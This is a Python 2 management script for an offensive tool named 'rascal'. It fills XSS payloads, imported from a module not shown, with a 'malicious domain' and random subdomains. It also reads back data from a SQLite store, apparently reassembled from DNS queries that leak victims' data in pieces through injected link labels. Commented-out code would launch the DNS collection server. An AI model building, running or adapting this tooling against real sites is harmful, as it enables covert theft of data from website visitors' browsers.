import sqlite3, argparse, sys, os, time, subprocess, logging 
import random, string

from payloads import payloads


def getQueries(database):
    conn = sqlite3.connect(database)
    iq = """insert or replace into output select timestamp, ip, session,  group_concat(query,"") 
                 from (
                    select min(date) as timestamp, ip,  session,part, query 
                    from queries group by session, part order by session, part
                 ) group by session order by session, part;"""
    conn.execute(iq)
    q="select * from output order by timestamp"
    result=conn.execute(q)
    for row in result:
	    print row
    conn.close()
    return

def startDaemon(): 
    print """Not implemented yet"""
    return

def randomString():
    """Generate a random string of fixed length """
    length = random.randrange(4, 10)
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def getPid(pidfile):
    pid = 0
    try: 
        f=open(pidfile,"r")
        pid = int(f.read())
        f.close()
    except Exception, e:
        logging.error("Error reading pid file")

    return pid

def writePid(pidfile, pid):
    try:
        f=open(pidfile,"w")
        f.write(str(pid))
        f.close()
    except Exception, e: 
        logging.error("Error writing pidfile")
   

def pidExists(pid):
    if pid < 0: return False #NOTE: pid == 0 returns True
    try:
        os.kill(pid, 0) 
    except Exception, e:  
        return False
    else:
        return True # no error, we can send a signal to the process

def killPid(pid):
    if pid < 0: return False #NOTE: pid == 0 returns True
    try:
        os.kill(pid,15)
    except Exception, e: 
        logging.error("SIGTERM process id %d error:\n%s" % (pid, str(e)))
        return False
    else:
        return True # no error, we can send a signal to the process 

def __main__():
    p = argparse.ArgumentParser(description="rascal management script")
    l_grp = p.add_argument_group('List')
    gp_grp = p.add_argument_group('Get Payload Code')
    gd_grp = p.add_argument_group('Get Data Collected')
    gd_grp.add_argument("-g",action="store_true", help="Get collected data")
    gp_grp.add_argument("--code",action="store_true",help="Print XSS code with given variables")
    l_grp.add_argument("-l","--list",action="store_true",help="List payloads available")
    gp_grp.add_argument("-p","--payload",type=int,help="Payload ID to use",default=0)
    gp_grp.add_argument("-d","--domain",
        metavar="<domainname>",
        help="Malicious domain used for the XSS attack")
    gp_grp.add_argument("--maxchar",
        metavar="<#linklabel_chars>",
        default=40,
        help="XSS: Max chars used on each <link> label injected")
    gp_grp.add_argument("-s","--suffix",
        metavar="<Session Suffix>",
        help="String that will be concatenated the SESSION ID subdomain")
    gd_grp.add_argument("--db",
        metavar="<file>",
        help="Database file")
    #TODO: Group options and set dependencies
    #TODO: manage the server easily
    #p.add_argument("-i",help="zone reg",default="*.domain.local. IN A 127.0.0.1")
    #p.add_argument("--start",action='store_true',help="Start DNS server")
    #p.add_argument("--stop",action='store_true',help="Stop DNS server")
    #p.add_argument("--log",help="Log file",default="./rascal.log")

    args = p.parse_args()

    pidfile = "./rascal.pid"

    if args.g and not args.db:
	p.print_help()
        print("\nerror: --db options is needed")
        sys.exit(1)
    if not (args.g or args.code or args.list): 
        p.print_help()
        print("\nerror: Choose at least on of the -g, --code or -l parametres")
        sys.exit(1)

    if args.g and args.db:
        getQueries(args.db)
    if args.list:
        print("Payloads:\n%s" % payloads)
	sys.exit(0)
    if args.code:
        if args.domain:
            domain=args.domain
        else:
            domain="DOMAIN"
	
        maxchar=str(args.maxchar)
        payload=payloads[args.payload]
        session_suffix=str(args.suffix)
	
	payload = payload.replace("%MAXCHAR%",maxchar)
	payload = payload.replace("%DOMAIN%",domain)
	payload = payload.replace("%SESSION_SUFFIX%",session_suffix)
	payload = payload.replace("%DATASUBD%",randomString())
	payload = payload.replace("%PARTSUBD%",randomString())
        payload = payload.replace("%SESSIONSUBD%",randomString())
        payload = payload.replace("%DOMAINSUBD%",randomString())
        
	print("Payload selected: \n")
        print("  " + payload)
    

    """ TODO: Add easy server start parametre
    if args.start:

        pid = getPid(pidfile)
        if pid and pidExists(pid):
            logging.error("Server is already up")
            sys.exit(1)
        else:
            log=open(args.log,"a")
	    logging.error("Openning the process...")
	    p = subprocess.Popen(['python', './bribon.py','--db',args.db,'--domain',args.domain,'--logger','bribonlogger'],
		     stdout=log, stderr=subprocess.STDOUT)
        writePid(pidfile,p.pid)

    if args.stop:
        pid = getPid(pidfile)
        if killPid(pid):
            logging.info("Process terminated")
            os.remove(pidfile)
        else:
            logging.error("Process id %d could not be stopped" % pid)
      """  
 
if __name__ == '__main__':
    __main__()
